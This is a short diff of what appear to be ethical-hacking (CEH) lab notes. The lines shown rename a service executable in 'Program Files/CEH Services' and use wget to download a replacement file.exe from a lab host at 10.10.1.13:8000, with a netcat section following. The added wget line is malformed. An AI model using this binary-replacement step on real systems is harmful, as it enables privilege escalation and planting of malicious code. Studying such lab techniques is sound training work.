@@ -1141,6 +1141,8 @@ and type
   cd ../../.. ; cd "Program Files/CEH Services".
   >>
   move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe.
+  wget http http://10.10.1.13:8000/file.exe
+  two files to get
   ```
   >>netcat
   ```console
